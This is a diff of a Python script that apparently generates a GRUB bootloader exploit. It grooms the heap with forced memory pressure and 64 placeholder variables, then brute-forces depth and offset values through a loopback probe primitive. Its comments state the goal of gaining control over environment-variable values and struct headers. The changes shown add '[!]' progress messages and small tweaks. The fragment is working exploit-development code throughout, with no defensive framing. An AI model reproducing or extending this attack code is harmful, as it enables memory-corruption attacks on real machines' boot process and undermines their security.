@@ -46,7 +46,7 @@ class Primitive:
         res += self._rf.define(
             [
                 f'loopback probe ({self._name})$1+',
-                'search --file does_not_exist --hint probe',
+                'search --file does_not_exist',
                 'loopback -d probe'
             ]
         )
@@ -128,6 +128,7 @@ def main():
 
     trigger = []
     trigger += grub_print(BANNER)
+    trigger += grub_print('[!] setup')
     trigger += find_root('/x/base', 'root')
     # initial setup things
     trigger += command('load_env -f /x/e.dat template')
@@ -141,7 +142,9 @@ def main():
 
     trigger += vs.define('t_0')
 
+    trigger += grub_print('[!] Forcing memory pressure')
     trigger += force_regions_to_exist()
+    trigger += grub_print('[!] Setting up construction')
     # setup the construction
     for i in range(64):
         trigger += vs.define(f'uwu_{i}')
@@ -155,6 +158,7 @@ def main():
 
     trigger += command('echo ${end}')
     trigger += command('if [ ${end} = NONE ] ; then normal_exit ; fi')
+    trigger += grub_print('[!] Determining Depth')
 
     # and now we try to get full control over the env vars value and the struct
     # header.
@@ -167,7 +171,7 @@ def main():
             internal += command(f'set fun={fun:04}')
             internal += probe.trigger(depth, fun)
             internal += command('eval "set curr=\\$${end}"')
-            internal += command('echo ${curr}')
+            # internal += command('echo ${curr}')
             internal += command(
                 f'if [ "${{curr}}" = {teststr} ]; then set found=true ; break ; fi'
             )
@@ -175,7 +179,7 @@ def main():
     internal += ['break']
 
     trigger += while_loop('1 = 1', internal)
-    trigger += command('echo ${depth_} ${fun} ${curr}')
+    trigger += command('echo [!] Found: ${depth_} ${fun} ${curr}')
 
     # from this point on we need to be very careful about variable names, as
     # introducing a fake grub_env_var will make some inaccessible.
